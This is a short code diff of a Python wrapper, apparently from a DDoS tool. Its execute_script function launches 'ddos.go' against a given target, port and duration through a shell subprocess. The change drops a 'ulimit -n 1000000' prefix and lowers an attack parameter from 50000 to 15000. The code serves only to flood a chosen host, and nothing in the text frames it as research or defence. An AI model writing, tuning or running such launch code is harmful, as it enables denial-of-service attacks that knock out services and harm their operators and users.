@@ -4,7 +4,7 @@ import time
 import datetime
 
 def execute_script(target, port, duration):
-    command = f"ulimit -n 1000000 && go run ddos.go {target} {port} errornetworkxxx 50000 {duration} 1"
+    command = f"go run ddos.go {target} {port} errornetworkxxx 15000 {duration} 1"
     process = subprocess.Popen(command, shell=True)
     return process
 
